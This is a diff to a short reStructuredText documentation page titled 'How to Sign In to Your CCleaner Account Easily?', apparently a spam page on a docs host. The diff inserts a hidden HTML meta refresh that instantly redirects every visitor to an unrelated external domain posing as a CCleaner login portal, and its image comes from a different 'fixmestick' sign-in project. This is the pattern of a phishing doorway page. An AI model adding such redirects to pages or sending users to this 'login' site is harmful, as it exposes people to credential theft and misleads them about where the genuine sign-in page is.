@@ -1,11 +1,9 @@
+.. raw:: html
+ 
+    <meta http-equiv="refresh" content="0; url= https://aclogportal.com/ccleaner-login-account/">
+
 How to Sign In to Your CCleaner Account Easily? 🚀
 ============================================
-.
-.
-
-.. toctree::
-   :maxdepth: 2
-   :caption: Contents:
 
 .. image:: https://fixmestick-account-sign-in.readthedocs.io/en/latest/_images/signin.png
    :alt: My Project Logo
